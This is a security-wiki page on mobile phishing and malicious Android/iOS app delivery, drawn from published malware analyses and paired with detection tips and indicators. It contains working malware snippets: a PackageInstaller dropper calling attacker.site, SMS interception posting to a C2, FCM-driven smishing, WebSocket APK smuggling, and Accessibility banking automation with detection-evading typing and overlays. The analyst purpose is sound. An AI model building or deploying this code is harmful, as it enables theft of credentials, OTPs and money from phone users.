# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターが phishing（SEO、social engineering、fake stores、dating apps など）を通じて **malicious Android APKs** と **iOS mobile-configuration profiles** を配布するために使う技術を扱います。
> この内容は、Zimperium zLabs によって公開された SarangTrap campaign（2025）およびその他の公開調査を基にしています。

## Attack Flow

1. **SEO/Phishing Infrastructure**
* 数十個の look-alike domains（dating、cloud share、car service…）を登録する。
– `<title>` 要素に local language の keywords と emojis を使い、Google で上位表示を狙う。
– Android（`.apk`）と iOS の両方の install instructions を同じ landing page でホストする。
2. **First Stage Download**
* Android: *unsigned* または “third-party store” の APK への direct link。
* iOS: `itms-services://` または malicious **mobileconfig** profile への plain HTTPS link（下記参照）。
3. **Post-install Social Engineering**
* 初回起動時にアプリは **invitation / verification code**（限定アクセスの演出）を要求する。
* code は HTTP 経由で Command-and-Control (C2) に **POST** される。
* C2 は `{"success":true}` を返す ➜ malware は継続する。
* valid code を送らない Sandbox / AV の dynamic analysis では **悪意のある挙動が一切見えない**（evasion）。
4. **Runtime Permission Abuse** (Android)
* 危険な permissions は、C2 からの positive response の **後にのみ** 要求される:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 最近の variant では `AndroidManifest.xml` から SMS の `<uses-permission>` を **削除** する一方で、Java/Kotlin の code path には reflection を使って SMS を読む処理を残している ⇒ static score は下がるが、`AppOps` abuse や古い targets で permission を付与する端末では引き続き動作する。

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 では sideloaded apps 向けに **Restricted settings** が導入され、Accessibility と Notification Listener のトグルは、ユーザーが **App info** で restricted settings を明示的に許可するまでグレーアウトされる。
* phishing pages と droppers は現在、sideloaded app に対して **allow restricted settings** を有効化し、その後 Accessibility/Notification access を有効にするための、UI 手順を段階的に案内する。
* 新しい bypass としては、payload を **session-based PackageInstaller flow**（app stores が使うのと同じ方法）でインストールする手法がある。Android はそのアプリを store-installed とみなすため、Restricted settings は Accessibility をもはやブロックしない。
* Triage のヒント: dropper 内で `PackageInstaller.createSession/openSession` を grep し、さらに victim を `ACTION_ACCESSIBILITY_SETTINGS` または `ACTION_NOTIFICATION_LISTENER_SETTINGS` に即座に遷移させる code を探す。

6. **Facade UI & Background Collection**
* アプリは harmless な view（SMS viewer、gallery picker）を local に実装して表示する。
* その一方で以下を exfiltrate する:
- IMEI / IMSI, phone number
- 完全な `ContactsContract` dump（JSON array）
- `/sdcard/DCIM` 内の JPEG/PNG を [Luban](https://github.com/Curzibn/Luban) で圧縮してサイズ削減
- 任意の SMS content (`content://sms`)
Payloads は **batch-zipped** され、`HTTP POST /upload.php` で送信される。
7. **iOS Delivery Technique**
* 単一の **mobile-configuration profile** で `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` などを要求し、端末を “MDM”-like supervision に enroll できる。
* Social-engineering の手順:
1. Settings ➜ *Profile downloaded* を開く。
2. *Install* を 3 回タップする（phishing page の screenshots）。
3. unsigned profile を信頼すると ➜ attacker は App Store review なしで *Contacts* と *Photo* entitlement を得る。
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads は、ブランド付き icon/label で phishing URL を Home Screen に **pin** できる。
* Web Clips は **full-screen** で実行でき（browser UI を隠す）、さらに **non-removable** に設定できるため、victim は icon を消すために profile 自体を削除するしかなくなる。
9. **Network Layer**
* Plain HTTP、しばしば port 80 上で、`api.<phishingdomain>.com` のような HOST header を使う。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS なし → 見つけやすい）。

## Red-Team Tips

* **Dynamic Analysis Bypass** – malware assessment 中は、Frida/Objection で invitation code phase を自動化し、malicious branch に到達させる。
* **Manifest vs. Runtime Diff** – `aapt dump permissions` と runtime の `PackageManager#getRequestedPermissions()` を比較する; missing dangerous perms は red flag。
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE` を設定して、code entry 後の不自然な POST burst を検知する。
* **mobileconfig Inspection** – macOS で `security cms -D -i profile.mobileconfig` を使い、`PayloadContent` を列挙して excessive entitlements を見つける。

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 指標（一般）
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

このパターンは、政府給付を装ったキャンペーンで観測されており、インドのUPI認証情報とOTPを盗むために使われています。運用者は、配信と耐障害性のために信頼性の高いプラットフォームを連鎖的に利用します。

### 信頼されたプラットフォームをまたぐ配信チェーン
- YouTubeの誘導動画 → 説明欄に短縮リンク
- 短縮リンク → 正規ポータルを模したGitHub Pagesのフィッシングサイト
- 同じGitHubリポジトリにAPKがホストされ、ファイルへ直接リンクする偽の“Google Play”バッジ付き
- 動的なフィッシングページはReplit上で稼働; リモートコマンドチャネルはFirebase Cloud Messaging (FCM) を使用

### 埋め込みペイロードとオフラインインストールを伴うDropper
- 1つ目のAPKはインストーラ（dropper）で、実際のマルウェアを `assets/app.apk` に同梱し、クラウド検出を弱めるためにユーザーへWi‑Fi/モバイルデータを無効にするよう促します。
- 埋め込まれたペイロードは、無害なラベル（例: “Secure Update”）でインストールされます。インストール後、インストーラとペイロードの両方が別々のアプリとして存在します。

静的トリアージのヒント（埋め込みペイロードをgrepする）:
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlinkを介した動的なendpoint discovery
- Malwareはshortlinkから、ライブなendpointのプレーンテキストのカンマ区切りリストを取得する; 単純な文字列変換で最終的なphishing pageのpathを生成する。

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebViewベースのUPI認証情報収集
- 「Make payment of ₹1 / UPI‑Lite」ステップは、WebView内の動的エンドポイントから攻撃者のHTMLフォームを読み込み、機密フィールド（phone、bank、UPI PIN）を取得して、それらを `POST` で `addup.php` に送信します。

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 自己伝播と SMS/OTP 傍受
- 初回実行時に攻撃的な権限を要求する:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 連絡先はループ処理され、被害者のデバイスから smishing SMS を大量送信するために使われる。
- 受信した SMS は broadcast receiver によって傍受され、メタデータ（送信者、本文、SIM slot、デバイスごとのランダム ID）とともに `/addsm.php` にアップロードされる。

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) としてのレジリエントな C2
- ペイロードは FCM に登録し、プッシュメッセージが `_type` フィールドを運ぶ。これはアクションをトリガーするための switch として使われる（例: phishing テキストテンプレートの更新、behaviours の切り替え）。

FCM ペイロードの例:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

攻撃者は、静的な APK リンクの代わりに、Google Play 風の誘導ページに埋め込まれた Socket.IO/WebSocket チャネルを使うことが増えています。これにより、ペイロード URL を隠蔽し、URL/拡張子フィルタを回避し、現実的なインストール UX を維持できます。

wild で観測される典型的なクライアントフロー:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

単純な制御を回避する理由:
- 静的なAPK URLは公開されず、payloadはWebSocketフレームからメモリ上で再構築される。
- 直接の.apk応答をブロックするURL/MIME/拡張子フィルタは、WebSockets/Socket.IO経由でトンネルされたバイナリデータを見逃す可能性がある。
- WebSocketsを実行しないクローラやURL sandboxは、payloadを取得できない。

WebSocket tradecraft と tooling も参照:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT campaign (ThreatFabric) は、現代のmobile phishing operationsがWebView droppers、Accessibility-driven UI automation、overlays/ransom、Device Admin coercion、Automated Transfer System (ATS)、crypto wallet takeover、さらにNFC-relay orchestrationまで組み合わせる具体例である。このセクションでは再利用可能なtechniquesを抽象化する。

### Stage-1: WebView → native install bridge (dropper)
攻撃者はattacker pageを指すWebViewを提示し、native installerを公開するJavaScript interfaceを注入する。HTMLボタンのタップでnative codeが呼び出され、dropperのassetsにバンドルされたsecond-stage APKをinstallし、その後それを直接起動する。

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML on the page:
```html
<button onclick="bridge.installApk()">Install</button>
```
インストール後、ドロッパーは explicit package/activity を通じて payload を起動します:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility は、ノードツリーで “Allow”/“OK” のようなボタンを見つけてクリックを送出し、後続のプロンプト承認をプログラム的に補助する。
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView を使った overlay phishing/ransom
Operator は次のコマンドを実行できる:
- URL から全画面の overlay を表示する、または
- inline HTML を渡して WebView overlay に読み込ませる。

想定される用途: coercion (PIN entry)、wallet を開いて PIN を取得する、ransom メッセージの表示。overlay 権限がない場合は、それが付与されることを確認するコマンドを保持しておく。

### リモート制御モデル – text の擬似スクリーン + screen-cast
- 低帯域: 定期的に Accessibility node tree をダンプし、表示中のテキスト/role/bounds を serialize して C2 に擬似スクリーンとして送信する (`txt_screen` のような一回実行コマンドと、`screen_live` のような継続コマンド)。
- 高忠実度: 必要に応じて MediaProjection を要求し、screen-casting/recording を開始する (`display` / `record` のようなコマンド)。

### ATS playbook (bank app automation)
JSON task が与えられたら、bank app を開き、Accessibility を使って text queries と coordinate taps を組み合わせながら UI を操作し、求められたら被害者の payment PIN を入力する。

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- 現在の認証情報を期限切れにして変更を強制する（Accessibility が新しい PIN/password を取得する）:
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard の biometric 機能を無効化して、非 biometric の unlock を強制する:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: 最近のAndroidでは、多くの `DevicePolicyManager` 制御は `Device Owner/Profile Owner` を必要としますが、一部のOEMビルドでは緩い場合があります。必ず対象のOS/OEMで検証してください。

### NFC relay orchestration (NFSkate)
Stage-3 は外部の NFC-relay モジュール（例: NFSkate）をインストールして起動し、さらに relay 中に被害者を誘導するための HTML template まで渡せます。これにより、オンライン ATS と並行して contactless の card-present cash-out が可能になります。

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors は、Accessibility-driven automation と、基本的な behaviour biometrics に対する anti-detection を組み合わせる傾向を強めています。最近の banker/RAT は、相補的な 2 つの text-delivery mode と、ランダム化された cadence で人間の typing を模倣する operator toggle を示しています。

- Discovery mode: visible nodes を selectors と bounds で列挙し、操作前に入力を正確に target します（ID, text, contentDescription, hint, bounds）。
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` を target node に直接送る（安定、keyboard 不要）;
- Mode 2 – clipboard set + `ACTION_PASTE` を focused node に実行する（直接 setText が blocked される場合に機能）.
- Human-like cadence: operator が提供した string を分割し、イベント間に 300–3000 ms の randomized delay を入れて 1 文字ずつ送信し、“machine-speed typing” ヒューリスティックを回避します。実装方法は、`ACTION_SET_TEXT` で value を段階的に増やすか、1 文字ずつ paste します。

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

詐欺用のblocking overlaysには以下が含まれる:
- operator-controlled opacity を持つフルスクリーンの `TYPE_ACCESSIBILITY_OVERLAY` を表示し、remote automation がその下で進行している間は victim に対して不透明に保つ。
- 通常公開されるコマンド: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

調整可能な alpha を持つ最小限の overlay:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## WebView bridge、JNI文字列デコーダ、段階的DEXローディングを使うマルチステージAndroidドロッパー

CERT Polskaの2026年4月3日の**cifrat**に関する分析は、表示されるAPKが実質的にインストーラシェルにすぎない、現代的なphishing配信Androidローダーの良い参考例です。再利用できる手口の本質はファミリー名ではなく、各stageの連結方法です:

1. phishingページがlure APKを配布する。
2. Stage 0が`REQUEST_INSTALL_PACKAGES`を要求し、ネイティブ`.so`を読み込み、埋め込まれたblobを復号し、**PackageInstaller sessions**でstage 2をインストールする。
3. Stage 2が別の隠しassetを復号し、それをZIPとして扱い、最終RAT用に**動的にDEXを読み込む**。
4. 最終stageはAccessibility/MediaProjectionを悪用し、制御/データ通信にWebSocketsを使う。

### インストーラコントローラとしてのWebView JavaScript bridge

WebViewを偽装ブランディングだけに使うのではなく、lureはローカル/リモートページがデバイスをfingerprintし、ネイティブのインストールロジックを起動できるbridgeを公開できます:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
トリアージのアイデア:
- `addJavascriptInterface`、`@JavascriptInterface`、`loadUrl("file:///android_asset/`、および同じ activity で使われている remote phishing URL を grep する
- installer のようなメソッド（`start`、`install`、`openAccessibility`、`requestOverlay`）を公開している bridge に注意する
- bridge の背後に phishing page がある場合は、単なる UI ではなく operator/controller surface として扱う

### `JNI_OnLoad` で登録された Native string decoding

1つの有用なパターンは、一見無害に見える Java method だが、実際には `JNI_OnLoad` 中の `RegisterNatives` によって back されているものです。cifrat では、decoder は最初の char を無視し、2文字目を 1-byte XOR key として使い、残りを hex-decoding し、各 byte を `((b - i) & 0xff) ^ key` として変換していました。

最小の offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
以下を見たら使ってください:
- URLs、package names、または keys に対する、1つの native-backed Java method への繰り返し呼び出し
- `JNI_OnLoad` が classes を解決して `RegisterNatives` を呼び出す
- DEX に意味のある plaintext strings がほとんどなく、代わりに 1つの helper に渡される短い hex-looking constants が多数ある

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

このファミリーは、汎用的に hunting する価値のある 2つの unpacking layer を使っていました:

- **Stage 0**: native decoder で導出した XOR key を使って `res/raw/*.bin` を decrypt し、その後 `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit` を通じて plaintext APK を install する
- **Stage 2**: `FH.svg` のような一見無害な asset を extract し、RC4-like routine で decrypt して、結果を ZIP として parse し、hidden DEX files を load する

これは本物の dropper/loader pipeline の強い指標です。各 layer が次の stage を basic static scanning から opaque に保つためです。

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` と `PackageInstaller` session calls
- install 後に chain を継続するための `PACKAGE_ADDED` / `PACKAGE_REPLACED` 受信処理
- 非メディア拡張子の `res/raw/` または `assets/` 配下の encrypted blobs
- custom decryptors の近くにある `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling

### Native anti-debugging through `/proc/self/maps`

native bootstrap は `libjdwp.so` を探すために `/proc/self/maps` も scan し、存在すれば abort していました。これは実用的な early anti-analysis check です。JDWP-backed debugging は認識可能な mapped library を残すためです:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Hunting ideas:
- `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu` を native code / decompiler output で grep する
- Frida hooks の到着が遅すぎる場合は、先に `.init_array` と `JNI_OnLoad` を確認する
- anti-debug + string decoder + staged install は独立した findings ではなく、1つの cluster として扱う

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
